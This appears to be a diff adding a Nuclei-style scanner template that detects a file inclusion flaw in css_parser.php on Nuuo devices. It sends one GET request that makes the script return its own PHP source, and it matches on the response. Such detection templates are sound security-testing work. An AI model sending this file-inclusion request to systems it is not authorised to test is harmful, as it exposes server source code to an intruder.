@@ -1,0 +1,27 @@
+id: poc-yaml-nuuo-file-inclusion
+info:
+  name: "Nuuo css_parser.php 文件包含漏洞"
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: Nuuo
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/css_parser.php?css=css_parser.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+      - type: word
+        part: header
+        words:
+          - "text/css"
+      - type: word
+        part: body
+        words:
+          - "$_GET['css']"
